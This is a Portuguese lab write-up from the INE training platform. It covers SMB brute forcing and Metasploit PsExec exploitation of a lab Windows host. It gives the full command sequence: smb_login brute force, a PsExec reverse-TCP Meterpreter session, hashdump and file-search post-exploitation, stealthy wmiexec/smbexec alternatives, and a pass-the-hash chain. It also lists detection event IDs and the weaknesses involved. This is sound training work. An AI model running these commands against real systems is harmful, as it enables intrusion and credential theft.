# 🧪 Lab Report — SMB Login Brute Force + PsExec Meterpreter

> **Plataforma:** INE
> **Tema central:** Detecção de dialetos SMB → Brute force de credenciais → Acesso via PsExec → Shell Meterpreter em Windows
> **Alvo:** `demo.ine.local`

---

## 🎯 Objetivo

Identificar o servidor SMB, descobrir credenciais válidas via brute force e usar o módulo PsExec do Metasploit para obter uma sessão Meterpreter no sistema Windows alvo.

---

## 📋 Sumário de Etapas

| # | Ação | Ferramenta | Resultado |
|---|------|-----------|-----------|
| 1 | Port scan | `nmap` | Porta 445 SMB aberta |
| 2 | Detectar dialetos SMB | `smb-protocols` NSE | Versões suportadas identificadas |
| 3 | Brute force de credenciais | `smb_login` | 4 usuários e senhas encontrados |
| 4 | Acesso via PsExec | `exploit/windows/smb/psexec` | Meterpreter SYSTEM |
| 5 | Leitura da flag | `shell` + `type` | `e0da81a9cd42b261bc9b90d15f780433` |

---

## 🔬 Execução Passo a Passo

### Step 1 — Port Scan Inicial

```bash
nmap demo.ine.local
```

**Resultado relevante:**
```
445/tcp  open  microsoft-ds
139/tcp  open  netbios-ssn
```

SMB exposto — superfície de ataque confirmada.

---

### Step 2 — Identificar Dialetos SMB

```bash
nmap -p445 --script smb-protocols demo.ine.local
```

**O que o script `smb-protocols` faz:** Negocia com o servidor para listar todas as versões do protocolo SMB que ele aceita.

**Output típico:**
```
| smb-protocols:
|   dialects:
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.0.2
|     2.1
|     3.0
|     3.0.2
|     3.1.1
```

**Por que isso importa:**

| Dialeto | Relevância |
|---------|-----------|
| `NT LM 0.12` (SMBv1) | ⚠️ Vulnerável ao EternalBlue (MS17-010) |
| `2.0.2` – `2.1` | Sem vulnerabilidades críticas conhecidas recentes |
| `3.0` – `3.1.1` | Mais seguro, suporta criptografia |

Identificar os dialetos suportados define quais vetores de ataque estão disponíveis **antes** de tentar qualquer exploit.

---

### Step 3 — Brute Force de Credenciais SMB

```bash
msfconsole -q

use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS demo.ine.local
set VERBOSE false
exploit
```

**Por que `VERBOSE false`:** Sem essa flag, o módulo exibe cada tentativa falha — potencialmente milhares de linhas. Com `false`, só mostra credenciais válidas.

**Resultado:**
```
[+] demo.ine.local:445 - Success: '.\administrator:qwertyuiop'
[+] demo.ine.local:445 - Success: '.\john:abc123'
[+] demo.ine.local:445 - Success: '.\demo:password'
[+] demo.ine.local:445 - Success: '.\alice:letmein'
```

**4 credenciais encontradas.** O foco é na conta `Administrator` por ter os maiores privilégios.

**Por que `Administrator` é o alvo prioritário para PsExec:**
PsExec requer privilégios de administrador local para instalar o serviço remoto. A conta `Administrator` garante esse nível de acesso sem precisar verificar se outros usuários são admins locais.

---

### Step 4 — Acesso via PsExec

```bash
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass qwertyuiop
exploit
```

**O que é o PsExec e como funciona:**

O PsExec é uma ferramenta da Sysinternals (Microsoft) originalmente criada para administração remota legítima. O módulo do Metasploit reimplementa o mecanismo:

```
1. Autenticar no SMB com as credenciais fornecidas
        ↓
2. Copiar um executável temporário para o compartilhamento ADMIN$
   (C:\Windows\) via SMB
        ↓
3. Criar e iniciar um serviço Windows temporário apontando
   para o executável copiado
        ↓
4. O serviço executa o payload (Meterpreter) como NT AUTHORITY\SYSTEM
        ↓
5. Meterpreter conecta de volta no listener do Metasploit
        ↓
6. O serviço e o executável são removidos após a sessão
```

**Por que o resultado é SYSTEM e não Administrator:**
Serviços Windows são executados pelo `Service Control Manager (SCM)` que roda como `NT AUTHORITY\SYSTEM` — o nível mais privilegiado do Windows, acima do próprio Administrator.

**Output esperado:**
```
[*] Started reverse TCP handler on IP_KALI:4444
[*] Connecting to the server...
[*] Authenticating to demo.ine.local:445|WORKGROUP as user 'Administrator'...
[*] Uploading payload...
[*] Created \KiHFJbcM.exe...
[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:demo.ine.local[\svcctl]...
[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:demo.ine.local[\svcctl]...
[*] Sending stage to IP_ALVO
[*] Meterpreter session 1 opened

meterpreter >
```

---

### Step 5 — Confirmar Privilégio e Localizar Flag

```bash
# Confirmar nível de acesso
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM

# Abrir shell nativa do Windows
meterpreter > shell

# Navegar e localizar a flag
C:\> cd /
C:\> dir
# Volume in drive C has no label.
# ...
# flag.txt

C:\> type flag.txt
# e0da81a9cd42b261bc9b90d15f780433
```

**Por que `cd /` funciona no Windows:** Dentro do shell Meterpreter, `/` é interpretado como `C:\`. É um atalho conveniente para ir direto à raiz do drive principal.

---

## 📊 Resultado Final

| Informação | Valor |
|-----------|-------|
| Porta SMB | 445/TCP |
| Dialetos suportados | SMBv1, v2, v3 |
| Credenciais encontradas | 4 (administrator, john, demo, alice) |
| Credencial usada | `administrator:qwertyuiop` |
| Método de acesso | PsExec via SMB |
| Nível de privilégio | `NT AUTHORITY\SYSTEM` |
| Flag | `e0da81a9cd42b261bc9b90d15f780433` |

---

## 🧠 Conceitos Consolidados

### PsExec — Detalhes Técnicos

```
Compartilhamentos usados pelo psexec:
ADMIN$  →  C:\Windows\ (onde o executável é copiado)
IPC$    →  Canal RPC para criar/controlar o serviço

Fluxo de artefatos:
1. ADMIN$\random.exe  criado
2. Serviço "random" criado via SCM
3. Serviço iniciado → executa payload
4. Payload conecta no listener
5. Serviço deletado
6. ADMIN$\random.exe  deletado
```

### Por Que PsExec Deixa Rastros

O PsExec é **detectável** por:
- EventID 7045 — novo serviço instalado
- EventID 7036 — serviço iniciado
- Arquivo temporário em `C:\Windows\` (mesmo que removido, logs de filesystem)
- Conexão autenticada em ADMIN$ nos logs SMB
- EDR pode detectar o padrão de: SMB auth + cópia de arquivo + criação de serviço

**Alternativas mais furtivas:**
```bash
# wmiexec — sem criação de serviço
python3 wmiexec.py administrator:qwertyuiop@IP

# smbexec — cria serviço mas não copia arquivo permanente
python3 smbexec.py administrator:qwertyuiop@IP
```

### Progresso do Ataque — Cadeia Completa

```
nmap → porta 445 aberta
        ↓
smb-protocols → SMBv1 ativo (possível EternalBlue)
        ↓
smb_login → administrator:qwertyuiop
        ↓
psexec → NT AUTHORITY\SYSTEM
        ↓
hashdump → todos os hashes do sistema
        ↓
Pass-the-Hash → lateral movement em outros sistemas
```

---

## 🔁 Pós-Exploração com Meterpreter

```bash
# Informações do sistema
meterpreter > sysinfo

# Dump de hashes NTLM (para Pass-the-Hash)
meterpreter > hashdump
# administrator:500:aad3...:HASH_NTLM:::
# john:1001:aad3...:HASH_NTLM:::

# Captura de screenshot
meterpreter > screenshot

# Buscar arquivos sensíveis
meterpreter > search -f *.txt
meterpreter > search -f *.conf
meterpreter > search -f *.xml

# Migrar para processo mais estável (evitar queda da sessão)
meterpreter > ps
meterpreter > migrate PID_DO_EXPLORER

# Elevação de privilégio se não for SYSTEM
meterpreter > getsystem
```

---

## ⚠️ Red Flags — O Que Tornou Este Sistema Vulnerável

| Problema | Impacto |
|---------|---------|
| SMBv1 ativo | Vetor adicional (EternalBlue) |
| Conta Administrator com senha fraca (`qwertyuiop`) | Brute force trivial |
| ADMIN$ acessível remotamente | PsExec funcional |
| Sem lockout de conta | Brute force irrestrito |
| SMB exposto na rede | Sem segmentação de rede |

---

## 📌 Relacionados

- [[SMB — Server Message Block]]
- [[Pass-the-Hash — Ataque PtH]]
- [[SMB Brute Force e Acesso a Shares]]
- [[SMB Enumeration com enum4linux]]
- [[Metasploit — Fundamentos e Arquitetura]]
- [[Hydra]]
- [[EternalBlue — MS17-010 e WannaCry]]

#lab #exploração #protocolo/smb #ferramenta/metasploit #psexec #windows #lateral-movement
